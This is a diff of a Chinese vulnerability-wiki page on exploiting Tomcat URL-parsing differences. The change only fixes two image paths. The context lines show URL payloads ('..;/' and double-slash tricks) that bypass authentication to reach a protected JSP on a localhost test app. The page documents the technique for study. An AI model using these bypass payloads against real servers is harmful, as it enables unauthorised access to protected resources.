@@ -74,7 +74,7 @@ Tomcat URL 解析差异性攻击利用
 
 运行之后，访问`http://localhost:8080/urltest/info/secret.jsp`，会显示无权限：
 
-![](/Users/aresx/Documents/VulWiki/.resource/TomcatURL解析差异性攻击利用/media/rId21.png)
+![](./.resource/TomcatURL解析差异性攻击利用/media/rId21.png)
 
 根据前面的分析构造如下几个payload都能成功绕过认证限制来访问：
 
@@ -84,6 +84,6 @@ Tomcat URL 解析差异性攻击利用
     http://localhost:8080/urltest/mi1k7ea/..;/info/secret.jsp
     http://localhost:8080//urltest/info/secret.jsp
 
-![](/Users/aresx/Documents/VulWiki/.resource/TomcatURL解析差异性攻击利用/media/rId22.png)
+![](./.resource/TomcatURL解析差异性攻击利用/media/rId22.png)
 
 整个的过程大致如此，就是利用解析的差异性来绕过认证
